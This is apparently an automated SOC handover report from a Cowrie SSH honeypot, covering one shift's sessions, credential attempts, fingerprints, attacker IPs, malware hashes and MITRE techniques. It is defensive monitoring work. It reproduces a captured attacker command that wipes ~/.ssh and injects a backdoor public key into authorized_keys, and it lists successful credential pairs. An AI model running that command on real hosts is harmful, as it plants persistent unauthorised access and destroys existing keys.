# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-10 |
| **Generated At** | 2026-05-10T09:42:17Z |
| **Shift Time** | 09:42 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **79** |
| Confirmed Threats | **60** |
| False Positives Filtered | **19** (24.1%) |
| Unique Attacker IPs | **33** |
| Countries of Origin | **16** |
| High Severity Cases | **4** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **75** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **38** |
| Unique Credential Pairs | **29** |
| Unique Usernames | **20** |
| Unique Passwords | **27** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 6 |
| `ubuntu` | 5 |
| `admin` | 3 |
| `test` | 2 |
| `a` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `` | 4 |
| `a` | 3 |
| `admin` | 2 |
| `root` | 2 |
| `orangepi` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `a` | `a` | 2 |
| `nil` | `` | 2 |
| `admin` | `admin` | 2 |
| `root` | `root` | 2 |
| `orangepi` | `orangepi` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `bitnami` | `119.92.70.82` | 2026-05-10T06:45:55 |
| `root` | `3245gs5662d34` | `119.92.70.82` | 2026-05-10T06:45:59 |
| `root` | `` | `95.106.188.188` | 2026-05-10T07:47:56 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **79** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 23 |
| OpenSSH | 18 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 20 | 3 |
| `c118de82e19e...` | Mirai/variant | 18 | 1 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 20 | 3 | libssh-based |
| `c118de82e19e...` | OpenSSH | 18 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `119.92.70.82`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **33** |
| Unique ASNs | **27** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS55836` | Reliance Jio Infocomm Limited | 3 | LOW |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS6327` | Shaw Communications | 1 | MEDIUM |
| `AS38841` | kbro CO. Ltd. | 1 | HIGH |
| `AS266468` | ACESSANET TELECON LTDA | 1 | LOW |
| `AS202578` | "KUBANENERGOSERVICE" LLC | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-500351898edb

| Field | Detail |
|---|---|
| **Source IP** | `119.92.70[.]82` |
| **First Seen** | 2026-05-10 06:45 |
| **Last Seen** | 2026-05-10 06:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 06:45:54` | `cowrie.session.connect` |
| `2026-05-10 06:45:54` | `cowrie.client.version` |
| `2026-05-10 06:45:54` | `cowrie.client.kex` |
| `2026-05-10 06:45:55` | `cowrie.login.success` |
| `2026-05-10 06:45:55` | `cowrie.session.params` |
| `2026-05-10 06:45:55` | `cowrie.command.input` |
| `2026-05-10 06:45:55` | `cowrie.command.failed` |
| `2026-05-10 06:45:55` | `cowrie.log.closed` |
| `2026-05-10 06:45:56` | `cowrie.session.params` |
| `2026-05-10 06:45:56` | `cowrie.command.input` |
| `2026-05-10 06:45:56` | `cowrie.session.file_download` |
| `2026-05-10 06:45:56` | `cowrie.log.closed` |
| `2026-05-10 06:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.92.70[.]82` to AbuseIPDB if not already reported
- [ ] Block `119.92.70[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad969004b73a

| Field | Detail |
|---|---|
| **Source IP** | `119.92.70[.]82` |
| **First Seen** | 2026-05-10 06:45 |
| **Last Seen** | 2026-05-10 06:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 06:45:58` | `cowrie.session.connect` |
| `2026-05-10 06:45:58` | `cowrie.client.version` |
| `2026-05-10 06:45:58` | `cowrie.client.kex` |
| `2026-05-10 06:45:59` | `cowrie.login.success` |
| `2026-05-10 06:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.92.70[.]82` to AbuseIPDB if not already reported
- [ ] Block `119.92.70[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a294c5f300e8

| Field | Detail |
|---|---|
| **Source IP** | `95.106.188[.]188` |
| **First Seen** | 2026-05-10 07:47 |
| **Last Seen** | 2026-05-10 07:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 07:47:55` | `cowrie.session.connect` |
| `2026-05-10 07:47:55` | `cowrie.client.version` |
| `2026-05-10 07:47:55` | `cowrie.client.kex` |
| `2026-05-10 07:47:56` | `cowrie.login.success` |
| `2026-05-10 07:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.106.188[.]188` to AbuseIPDB if not already reported
- [ ] Block `95.106.188[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48b3b2aa080c

| Field | Detail |
|---|---|
| **Source IP** | `95.106.188[.]188` |
| **First Seen** | 2026-05-10 07:47 |
| **Last Seen** | 2026-05-10 07:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 07:47:55` | `cowrie.session.connect` |
| `2026-05-10 07:47:55` | `cowrie.client.version` |
| `2026-05-10 07:47:55` | `cowrie.client.kex` |
| `2026-05-10 07:47:56` | `cowrie.login.success` |
| `2026-05-10 07:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.106.188[.]188` to AbuseIPDB if not already reported
- [ ] Block `95.106.188[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `95.106.188[.]188` | **18** | 2026-05-10 07:47 | 2026-05-10 07:47 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `119.92.70[.]82` | **16** | 2026-05-10 06:35 | 2026-05-10 07:52 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `150.95.25[.]34` | **9** | 2026-05-10 06:42 | 2026-05-10 09:18 | 6m | 0 | `T1592` | 🟢 LOW |
| `125.22.162[.]46` | **2** | 2026-05-10 06:37 | 2026-05-10 06:39 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `135.237.126[.]218` | **2** | 2026-05-10 07:00 | 2026-05-10 07:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.13.70[.]73` | 1 | 2026-05-10 07:54 | 2026-05-10 07:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.52.55[.]240` | 1 | 2026-05-10 09:35 | 2026-05-10 09:35 | 30s | 0 | `T1592` | 🟢 LOW |
| `120.48.26[.]185` | 1 | 2026-05-10 08:00 | 2026-05-10 08:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.177.83[.]26` | 1 | 2026-05-10 06:57 | 2026-05-10 06:57 | 20s | 0 | `T1592` | 🟢 LOW |
| `190.109.98[.]199` | 1 | 2026-05-10 08:14 | 2026-05-10 08:15 | 12s | 0 | `T1592` | 🟢 LOW |
| `197.248.207[.]139` | 1 | 2026-05-10 08:00 | 2026-05-10 08:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.229.220[.]180` | 1 | 2026-05-10 06:36 | 2026-05-10 06:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `42.5.4[.]20` | 1 | 2026-05-10 09:22 | 2026-05-10 09:23 | 13s | 0 | `T1592` | 🟢 LOW |
| `58.48.170[.]235` | 1 | 2026-05-10 08:00 | 2026-05-10 08:02 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `150.95.25[.]34` | TH | ZCOM THAI | **100** ⚠️ | 0 |
| `197.248.207[.]139` | KE | Safaricom Limited | **100** ⚠️ | 44 |
| `95.106.188[.]188` | RU | OJSC Rostelecom, Yaroslavl branch | **100** ⚠️ | 1 |
| `119.92.70[.]82` | PH | IPG | **100** ⚠️ | 50 |
| `125.22.162[.]46` | IN | ALLIANT TECHNOLOGIES | **100** ⚠️ | 3 |
| `58.48.170[.]235` | CN | CHINANET Hubei province network | **100** ⚠️ | 50 |
| `42.5.4[.]20` | CN | UNICOM Liaoning Province Network | **100** ⚠️ | 0 |
| `221.229.220[.]180` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `106.52.55[.]240` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `180.177.83[.]26` | TW | 8F., No.260, Sec. 2, Bade Rd., Songshan Dist., Taipei City 105, Taiwan (R.O.C.) | **100** ⚠️ | 17 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 41 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 34 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |

---

## 🔕 False Positive Summary (19 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 1 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 79 cases |
| Tool 34  | Credential Extractor        | ✅ 38 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 33 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 19 filtered (24.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 14 recon entry/entries in table (5 group(s) consolidating 47 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-10T09:42:17Z_
